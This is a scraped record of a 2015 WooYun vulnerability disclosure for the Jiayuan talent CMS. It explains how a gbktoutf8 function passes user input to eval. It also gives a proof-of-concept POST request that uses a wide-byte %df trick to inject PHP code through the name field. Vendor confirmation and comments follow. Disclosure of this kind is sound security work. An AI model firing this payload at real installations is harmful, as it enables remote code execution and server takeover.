{"id": 44461, "wybug_id": "wooyun-2015-0119192", "wybug_title": "嘉缘人才系统最新版命令执行getshell（官方网站重现可执行任意代码）", "wybug_corp": "finereason.com", "wybug_author": "无人知晓", "wybug_date": "2015-06-09 10:58", "wybug_open_date": "2015-09-11 15:28", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-11：\t细节向公众公开  简要描述： 嘉缘人才系统最新版命令执行 详细说明：  漏洞出现在frcms/inc/common.inc.php\nfunction gbktoutf8($str=''){\t    global $cfg;\t    if($cfg['charset']=='gbk'){\t        return eval('return '.iconv('gbk','utf-8',var_export($str,true)).';');\t       //return @iconv('gbk', 'utf-8', $str);\t    }else{\t        return $str;\t    }\t}\n这个函数用到了eval将字符编码从gbk转为utf8，若$str可控，就可以构造出命令执行漏洞。全局搜索代码，终于找到了一个利用的点: /member/company_map.php代码如下：\nif($do=='savemap'){\t\t$map = preg_replace(\"/[^0-9,:\\.-]/i\",'',$map);\t\tif($map==''){\t        showmsg('请先在地图上标注！',\"-1\",0,2000);exit();\t    }else{\t        $mapid=0;\t        $maps=explode(':',$map);\t        if(count($maps)>1){\t            $mapss=explode(',',$maps[1]);\t        }else{\t            showmsg('地图坐标数据异常！',\"-1\",0,2000);exit();\t        }\t        $post_data = array('title' => $name,'address' => $address,'ak' => $cfg['baiduak'],'latitude' => trim($mapss[1]),'longitude' => trim($mapss[0]),'coord_type' => 3,'geotable_id' => $cfg['geotable_id']);\t        require_once(FR_ROOT.'/inc/map.inc.php');\t        $bmap=new baidu_map();\t        if($rs=$db->get_one(\"select * from {$cfg['tb_pre']}member_map where m_mid=$Memberid\")){\t            //修改坐标\t            $post_data['id']=$rs['m_mapid'];\t            $mapresult=json_decode(!$rs['m_mapid']?$bmap->create_poi(gbktoutf8($post_data)):$bmap->update_poi(gbktoutf8($post_data)),true);\t            if($mapresult['status']==0){\t                $mapid=$mapresult['id'];\n$mapresult=json_decode(!$rs['m_mapid']?$bmap->create_poi(gbktoutf8($post_data)):$bmap->update_poi(gbktoutf8($post_data)),true);这里直接把$post_data带入了gbktoutf8函数中，从代码中可以看到，$post_data是由其他几个参数构成的一个数组。由于这套cms有一个类似全局注册变量的机制，所以我们可以控制这些参数。这里我们可以控制$name来构造命令执行，由于全局开了转义，默认GBK编码，可以通过宽字节%df把转义符吃掉。我们注册一个企业账户  \npost请求 http://localhost/frcms/member/?m=company_map&do=savemap&map=2:1  \tdata: name=a%df'.phpinfo(), %23\n   漏洞证明：  这里以官方demo站为例\n\n\n\n   修复方案：  不用eval来拼接gbktoutf8   版权声明：转载请注明来源 无人知晓@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-13 15:27 厂商回复： 收到，感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-09 11:12 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:12        | O_o)\t\t \n  mark    \n     2015-06-09 14:01 |    \t\th3hz \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 新手求收留)\t\t \n  mark ， 话说 多少rank才能成为实习白帽    \n     2015-06-09 16:01 |    \t\t上官元恒 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:3        | 屌丝程序员一枚，上能修电脑，下能装系统。)\t\t \n  @h3hz 30吧    \n     2015-06-14 15:49 |    \t\t网路游侠 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 不玩渗透好多年……)\t\t \n  嘉缘的人才系统应用非常广泛的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}